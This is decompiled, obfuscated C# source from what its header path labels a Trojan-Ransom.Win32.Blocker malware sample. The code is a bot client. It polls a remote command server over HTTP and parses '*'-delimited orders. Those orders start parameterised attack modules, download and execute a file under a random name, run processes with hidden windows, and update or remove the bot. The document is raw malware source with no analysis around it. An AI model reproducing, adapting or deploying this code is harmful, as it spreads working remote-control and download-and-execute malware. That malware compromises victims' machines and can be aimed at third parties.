// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=728989c32b6b09d5
// MVID: 91EA3868-EE8A-441B-BBED-0FA4D4EC628F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.vmn-1e0c513253ecbc325a94a613272827d5c84824ce.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0002
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private string \u0001 = string.Empty;
    private \u0005.\u0003 \u0001 = new \u0005.\u0003();

    public void \u0002()
    {
      this.\u0003();
      // ISSUE: method pointer
      Thread thread = new Thread(new ThreadStart((object) this, __methodptr(\u0004)));
      \u000E\u0002.\u007E\u001C\u0002((object) thread);
    }

    private void \u0003()
    {
      string[] strArray = new string[8]
      {
        \u0002.\u0004.\u0001(312),
        \u0005.\u0001.\u0001.\u0005,
        \u0002.\u0004.\u0001(329),
        \u0005.\u0001.\u0001.\u0002,
        \u0002.\u0004.\u0001(342),
        \u0005.\u0001.\u0001.\u0006,
        \u0002.\u0004.\u0001(355),
        \u0005.\u0001.\u0001.\u0007
      };
      string str1 = \u0010\u0003.\u0092(strArray);
      while (true)
      {
        try
        {
          string str2 = this.\u0002(\u0005.\u0001.\u0001.\u0001, str1);
          if (\u0097.\u007E\u0082((object) str2) > 0)
          {
            if (\u008F\u0002.\u007F(str2, \u0005.\u0001.\u0001.\u0004))
              break;
            \u000F\u0002.\u0001\u0002(-1);
          }
        }
        catch
        {
        }
        \u000F\u0002.\u001F\u0002(\u0005.\u0001.\u0001.\u0001 * 60 * 1000);
      }
    }

    private void \u0004()
    {
      string str1 = \u0019\u0003.\u0090(\u0002.\u0004.\u0001(368), \u0005.\u0001.\u0001.\u0005);
      while (true)
      {
        try
        {
          string str2 = this.\u0002(\u0005.\u0001.\u0001.\u0001, str1);
          if (\u0097.\u007E\u0082((object) str2) > 0)
          {
            if (\u008F\u0002.\u0080(str2, this.\u0001))
            {
              this.\u0002(str2);
              this.\u0001 = str2;
            }
          }
          else
          {
            if (this.\u0001.\u0001)
              this.\u0001.\u0003();
            try
            {
              \u0003.\u0004.\u0003();
            }
            catch
            {
            }
            try
            {
              \u0004.\u0002.\u0003();
            }
            catch
            {
            }
            try
            {
              \u0003.\u0003.\u0003();
            }
            catch
            {
            }
            this.\u0001 = string.Empty;
          }
        }
        catch
        {
        }
        \u000F\u0002.\u001F\u0002(\u0005.\u0001.\u0001.\u0001 * 60 * 1000);
      }
    }

    private string \u0002([In] string obj0, [In] string obj1)
    {
      \u0019\u0002.\u0002\u0004(false);
      HttpWebRequest httpWebRequest = (HttpWebRequest) \u0013\u0003.\u0096\u0003(obj0);
      \u0016\u0002.\u007E\u0099\u0003((object) httpWebRequest, \u0002.\u0004.\u0001(385));
      \u0016\u0002.\u007E\u0097\u0003((object) httpWebRequest, \u0002.\u0004.\u0001(430));
      \u0016\u0002.\u007E\u009D\u0003((object) httpWebRequest, \u0005.\u0001.\u0001.\u0004);
      byte[] numArray = \u001D\u0003.\u007E\u009D\u0002((object) \u0098\u0002.\u009C\u0002(), obj1);
      \u0001\u0003.\u007E\u0098\u0003((object) httpWebRequest, (long) numArray.Length);
      Stream stream = \u0093\u0002.\u007E\u009A\u0003((object) httpWebRequest);
      \u0088\u0002.\u007E\u0013\u0003((object) stream, numArray, 0, numArray.Length);
      \u000E\u0002.\u007E\u0010\u0003((object) stream);
      WebResponse webResponse = \u0097\u0002.\u007E\u009B\u0003((object) httpWebRequest);
      if (webResponse == null)
        return string.Empty;
      StreamReader streamReader = new StreamReader(\u0093\u0002.\u007E\u009C\u0003((object) webResponse));
      return \u001C\u0002.\u007E\u008C((object) \u001C\u0002.\u007E\u001B\u0003((object) streamReader));
    }

    private void \u0002([In] string obj0)
    {
      string[] strArray = new string[0];
      try
      {
        strArray = \u009C.\u007E\u0083((object) obj0, new char[1]
        {
          '*'
        });
      }
      catch
      {
      }
      string key = strArray[0];
      if (key == null)
        return;
      if (\u0005.\u0004.\u0001 == null)
        \u0005.\u0004.\u0001 = new Dictionary<string, int>(8)
        {
          {
            \u0002.\u0004.\u0001(439),
            0
          },
          {
            \u0002.\u0004.\u0001(452),
            1
          },
          {
            \u0002.\u0004.\u0001(465),
            2
          },
          {
            \u0002.\u0004.\u0001(478),
            3
          },
          {
            \u0002.\u0004.\u0001(491),
            4
          },
          {
            \u0002.\u0004.\u0001(504),
            5
          },
          {
            \u0002.\u0004.\u0001(513),
            6
          },
          {
            \u0002.\u0004.\u0001(522),
            7
          }
        };
      int num1;
      // ISSUE: explicit non-virtual call
      if (!__nonvirtual (\u0005.\u0004.\u0001.TryGetValue(key, out num1)))
        return;
      switch (num1)
      {
        case 0:
          try
          {
            this.\u0001.\u0001 = \u0095\u0002.\u009E(strArray[1]);
            this.\u0001.\u0001 = (int) \u0005\u0003.\u0017\u0002(strArray[2]);
            this.\u0001.\u0003 = \u0005\u0002.\u009C(strArray[3]);
            this.\u0001.\u0002 = \u0005\u0002.\u009C(strArray[4]);
            this.\u0001.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 1:
          try
          {
            \u0003.\u0004.\u0001 = \u0095\u0002.\u009E(strArray[1]);
            \u0003.\u0004.\u0001 = \u0005\u0002.\u009C(strArray[2]);
            \u0003.\u0004.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 2:
          try
          {
            \u0004.\u0002.\u0001 = \u0095\u0002.\u009E(strArray[1]);
            \u0004.\u0002.\u0001 = \u0005\u0003.\u0017\u0002(strArray[2]);
            \u0004.\u0002.\u0002 = \u0005\u0002.\u009C(strArray[3]);
            \u0004.\u0002.\u0003 = \u0005\u0002.\u009C(strArray[4]);
            \u0004.\u0002.\u0001 = \u0005\u0002.\u009C(strArray[5]);
            \u0004.\u0002.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 3:
          try
          {
            \u0003.\u0003.\u0001 = \u0095\u0002.\u009E(strArray[1]);
            \u0003.\u0003.\u0001 = \u0005\u0003.\u0017\u0002(strArray[2]);
            \u0003.\u0003.\u0003 = \u0005\u0002.\u009C(strArray[3]);
            \u0003.\u0003.\u0001 = \u0005\u0002.\u009C(strArray[4]);
            \u0003.\u0003.\u0002 = \u0005\u0002.\u009C(strArray[5]);
            \u0003.\u0003.\u0002();
            break;
          }
          catch
          {
            break;
          }
        case 4:
          try
          {
            string str = \u0019\u0003.\u0090(\u0005.\u0001.\u0001.\u0002(\u008C\u0002.\u007E\u000F\u0002((object) new Random(), 5, 12)), \u0002.\u0004.\u0001(531));
            \u009B\u0002.\u0004\u0004((object) new WebClient(), \u0095\u0002.\u009E(strArray[1]), \u0014\u0003.\u0091(\u0095\u0002.\u0004\u0002(\u0002.\u0004.\u0001(540)), \u0002.\u0004.\u0001(549), str));
            Process process = new Process();
            \u0016\u0002.\u007E\u001D\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), \u0014\u0003.\u0091(\u0095\u0002.\u0004\u0002(\u0002.\u0004.\u0001(540)), \u0002.\u0004.\u0001(549), str));
            int num2 = \u0094.\u007E\u0018\u0004((object) process) ? 1 : 0;
            break;
          }
          catch
          {
            break;
          }
        case 5:
          try
          {
            Process process = new Process();
            \u0011\u0002.\u007E\u0015\u0004((object) process, new ProcessStartInfo(\u0095\u0002.\u009E(strArray[1])));
            \u0007\u0003.\u007E\u001E\u0004((object) \u009F\u0002.\u007E\u0014\u0004((object) process), ProcessWindowStyle.Hidden);
            int num3 = \u0094.\u007E\u0018\u0004((object) process) ? 1 : 0;
            break;
          }
          catch
          {
            break;
          }
        case 6:
          \u0005.\u0001.\u0001.\u0002(\u0095\u0002.\u009E(strArray[1]));
          break;
        case 7:
          if (!\u008F\u0002.\u007F(strArray[1], \u001B\u0003.\u0002\u0002()) && !\u008F\u0002.\u007F(\u001C\u0002.\u007E\u008B((object) strArray[1]), \u0002.\u0004.\u0001(554)))
            break;
          \u0005.\u0001.\u0001.\u0005();
          break;
      }
    }

    static \u0004() => \u0001.\u0003.\u0002(typeof (\u0002.\u0004));
  }
}
